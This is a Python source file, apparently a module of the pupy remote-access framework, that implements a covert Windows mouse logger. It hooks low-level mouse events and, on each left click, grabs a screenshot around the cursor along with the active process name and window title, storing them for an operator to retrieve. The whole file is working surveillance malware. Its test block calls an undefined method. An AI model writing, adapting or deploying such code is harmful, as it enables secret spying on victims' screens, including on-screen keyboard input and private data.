# Mostly stolen from Nicolas VERDIER (contact@n1nj4.eu)
# Mostly stolen and recreated by golind
import sys
from ctypes import *
from ctypes.wintypes import *
import threading
import time
import datetime
import base64
import struct
from zlib import compress, crc32

import pupy

def _to_png(data, width, height):
    # From MSS
    line = width * 3
    png_filter = struct.pack('>B', 0)
    scanlines = b''.join(
        [png_filter + data[y * line:y * line + line] for y in reversed(range(height))]
    )
    magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)

    # Header: size, marker, data, CRC32
    ihdr = [b'', b'IHDR', b'', b'']
    ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
    ihdr[3] = struct.pack('>I', crc32(b''.join(ihdr[1:3])) & 0xffffffff)
    ihdr[0] = struct.pack('>I', len(ihdr[2]))

    # Data: size, marker, data, CRC32
    idat = [b'', b'IDAT', compress(scanlines), b'']
    idat[3] = struct.pack('>I', crc32(b''.join(idat[1:3])) & 0xffffffff)
    idat[0] = struct.pack('>I', len(idat[2]))

    # Footer: size, marker, None, CRC32
    iend = [b'', b'IEND', b'', b'']
    iend[3] = struct.pack('>I', crc32(iend[1]) & 0xffffffff)
    iend[0] = struct.pack('>I', len(iend[2]))

    return b''.join([
        magic,
        b''.join(ihdr),
        b''.join(idat),
        b''.join(iend)
    ])

from ctypes import (
    byref, memset, pointer, sizeof, windll,
    c_void_p as LPRECT,
    c_void_p as LPVOID,
    create_string_buffer,
    Structure,
    POINTER,
    WINFUNCTYPE,
)
import ctypes.wintypes
from ctypes.wintypes import (
    BOOL, DOUBLE, DWORD, HANDLE, HBITMAP, HDC, HGDIOBJ,
    HWND, INT, LPARAM, LONG,RECT,SHORT, UINT, WORD
)

class BITMAPINFOHEADER(Structure):
    _fields_ = [
        ('biSize',          DWORD),
        ('biWidth',         LONG),
        ('biHeight',        LONG),
        ('biPlanes',        WORD),
        ('biBitCount',      WORD),
        ('biCompression',   DWORD),
        ('biSizeImage',     DWORD),
        ('biXPelsPerMeter', LONG),
        ('biYPelsPerMeter', LONG),
        ('biClrUsed',       DWORD),
        ('biClrImportant',  DWORD)
    ]

class BITMAPINFO(Structure):
    _fields_ = [
        ('bmiHeader', BITMAPINFOHEADER),
        ('bmiColors', DWORD * 3)
    ]

# http://nullege.com/codes/show/src@m@o@mozharness-HEAD@external_tools@mouse_and_screen_resolution.py/114/ctypes.windll.user32.GetCursorPos
from ctypes import windll, Structure, c_ulong, byref

class POINT(Structure):
    _fields_ = [("x", c_ulong), ("y", c_ulong)]

def queryMousePosition():
    pt = POINT()
    windll.user32.GetCursorPos(byref(pt))
    return { "x": pt.x, "y": pt.y}

user32 = windll.user32
kernel32 = windll.kernel32
WH_MOUSE_LL=14
WM_MOUSEFIRST=0x0200

LRESULT = LPARAM
ULONG_PTR = WPARAM
HANDLE  = c_void_p
HHOOK   = HANDLE
HKL     = HANDLE
ULONG_PTR = WPARAM
HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
LPMSG = POINTER(MSG)

GetModuleHandleW = kernel32.GetModuleHandleW
GetModuleHandleW.restype = HMODULE
GetModuleHandleW.argtypes = [LPCWSTR]

SetWindowsHookEx = user32.SetWindowsHookExW
SetWindowsHookEx.argtypes = (c_int, HOOKPROC, HINSTANCE, DWORD)
SetWindowsHookEx.restype = HHOOK

SetTimer            = user32.SetTimer
SetTimer.restype    = ULONG_PTR
SetTimer.argtypes   = (HWND, ULONG_PTR, UINT, c_void_p)

KillTimer           = user32.KillTimer
KillTimer.restype   = BOOL
KillTimer.argtypes  = (HWND, ULONG_PTR)

GetForegroundWindow = user32.GetForegroundWindow

GetWindowThreadProcessId = user32.GetWindowThreadProcessId
GetWindowThreadProcessId.restype = DWORD
GetWindowThreadProcessId.argtypes = (HWND, POINTER(DWORD))

GetMessageW         = user32.GetMessageW

UnhookWindowsHookEx = user32.UnhookWindowsHookEx
CallNextHookEx      = user32.CallNextHookEx

psapi = windll.psapi
current_window = None

# Initilisations
SM_XVIRTUALSCREEN = 76
SM_YVIRTUALSCREEN = 77
SM_CXVIRTUALSCREEN = 78
SM_CYVIRTUALSCREEN = 79
SRCCOPY = 0xCC0020  # Code de copie pour la fonction BitBlt()##
DIB_RGB_COLORS = 0

GetSystemMetrics = windll.user32.GetSystemMetrics##
EnumDisplayMonitors = windll.user32.EnumDisplayMonitors
GetWindowDC = windll.user32.GetWindowDC
CreateCompatibleDC = windll.gdi32.CreateCompatibleDC
CreateCompatibleBitmap = windll.gdi32.CreateCompatibleBitmap
SelectObject = windll.gdi32.SelectObject
BitBlt = windll.gdi32.BitBlt
GetDIBits = windll.gdi32.GetDIBits
DeleteObject = windll.gdi32.DeleteObject

# Type des arguments
MONITORENUMPROC = WINFUNCTYPE(INT, DWORD, DWORD,
    POINTER(RECT), DOUBLE)
GetSystemMetrics.argtypes = [INT]
EnumDisplayMonitors.argtypes = [HDC, LPRECT, MONITORENUMPROC, LPARAM]
GetWindowDC.argtypes = [HWND]
CreateCompatibleDC.argtypes = [HDC]
CreateCompatibleBitmap.argtypes = [HDC, INT, INT]
SelectObject.argtypes = [HDC, HGDIOBJ]
BitBlt.argtypes = [HDC, INT, INT, INT, INT, HDC, INT, INT, DWORD]
DeleteObject.argtypes = [HGDIOBJ]
GetDIBits.argtypes = [HDC, HBITMAP, UINT, UINT, LPVOID,
    POINTER(BITMAPINFO), UINT]

# Type de fonction
GetSystemMetrics.restypes = INT
EnumDisplayMonitors.restypes = BOOL
GetWindowDC.restypes = HDC
CreateCompatibleDC.restypes = HDC
CreateCompatibleBitmap.restypes = HBITMAP
SelectObject.restypes = HGDIOBJ
BitBlt.restypes =  BOOL
GetDIBits.restypes = INT
DeleteObject.restypes = BOOL

def mouselogger_start():
    if pupy.manager.active(MouseLogger):
        return False

    try:
        mouselogger = pupy.manager.create(MouseLogger)
    except:
        return False

    return True

def mouselogger_dump():
    mouselogger = pupy.manager.get(MouseLogger)
    if mouselogger:
        return mouselogger.results

def mouselogger_stop():
    mouselogger = pupy.manager.get(MouseLogger)
    if mouselogger:
        pupy.manager.stop(MouseLogger)
        return mouselogger.results

class MouseLogger(pupy.Task):
    def __init__(self, *args, **kwargs):
        super(MouseLogger, self).__init__(*args, **kwargs)
        self.hooked  = None
        self.pointer = None

    def task(self):
        if not self.install_hook():
            raise RuntimeError("couldn't install mouselogger")

        msg = MSG()
        timer = SetTimer(0, 0, 1000, 0)
        while self.active:
            GetMessageW(byref(msg), 0, 0, 0)
        KillTimer(0, timer)

        self.uninstall_hook()

    def get_screenshot(self):
        pos = queryMousePosition()

        limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
        limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
        limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
        limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)

        height = min(100,limit_height)
        width = min(200,limit_width)
        left = max(pos['x']-100,limit_left)
        top = max(pos['y']-50,limit_top)

        srcdc = GetWindowDC(0)
        memdc = CreateCompatibleDC(srcdc)
        bmp = CreateCompatibleBitmap(srcdc, width, height)
        try:
            SelectObject(memdc, bmp)
            BitBlt(memdc, 0, 0, width, height, srcdc, left, top, SRCCOPY)
            bmi = BITMAPINFO()
            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER)
            bmi.bmiHeader.biWidth = width
            bmi.bmiHeader.biHeight = height
            bmi.bmiHeader.biBitCount = 24
            bmi.bmiHeader.biPlanes = 1
            buffer_len = height * ((width * 3 + 3) & -4)
            pixels = create_string_buffer(buffer_len)
            bits = GetDIBits(memdc, bmp, 0, height, byref(pixels),
                pointer(bmi), DIB_RGB_COLORS)
        finally:
            DeleteObject(srcdc)
            DeleteObject(memdc)
            DeleteObject(bmp)

        if bits != height or len(pixels.raw) != buffer_len:
            raise ValueError('MSSWindows: GetDIBits() failed.')

        return pixels.raw, height, width

    def install_hook(self):
        self.pointer = HOOKPROC(self.hook_proc)
        self.hooked = SetWindowsHookEx(
            WH_MOUSE_LL,
            self.pointer,
            GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True

    def uninstall_hook(self):
        if self.hooked is None:
            return

        UnhookWindowsHookEx(self.hooked)
        self.hooked = None

    def hook_proc(self, nCode, wParam, lParam):
        ##http://www.pinvoke.net/default.aspx/Constants.WM
        if wParam == 0x201:
            buf, height, width = self.get_screenshot()
            exe, win_title="unknown", "unknown"
            try:
                exe, win_title=get_current_process()
            except Exception:
                pass

            self.append((
                str(datetime.datetime.now()), height, width, exe,
                win_title, base64.b64encode(_to_png(buf, width, height))
            ))

        return CallNextHookEx(self.hooked, nCode, wParam, lParam)

#credit: Black Hat Python - https://www.nostarch.com/blackhatpython
def get_current_process():
    hwnd = GetForegroundWindow()

    pid = c_ulong(0)
    GetWindowThreadProcessId(hwnd, byref(pid))

    #process_id = "%d" % pid.value

    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    #return "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    return executable.value, window_title.value

if __name__=="__main__":
    ml = MouseLogger()
    ml.start()
    while True:
        for d, height, width, exe, win_title, buf in ml.retrieve_screenshots():
            print "screenshot of %s/%s taken at %s (%s bytes) from %s : %s "%(height, width, d, len(buf), exe, win_title)
        time.sleep(1)
